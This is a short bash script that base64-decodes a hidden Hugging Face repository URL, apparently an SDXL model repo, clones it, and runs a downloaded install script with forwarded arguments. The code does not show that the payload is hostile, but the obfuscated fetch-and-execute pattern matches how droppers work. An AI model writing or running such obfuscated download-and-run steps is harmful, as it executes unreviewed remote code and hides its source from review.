#!/bin/bash
VAR="$(echo aHR0cHM6Ly9odWdnaW5nZmFjZS5jby96dXYwL1NEWExGMTc | base64 --decode)"
git clone $VAR SD
\cp -f ./SD/install_rp.sh "ss.sh"
sh ./ss.sh $1 $2 $3 $4
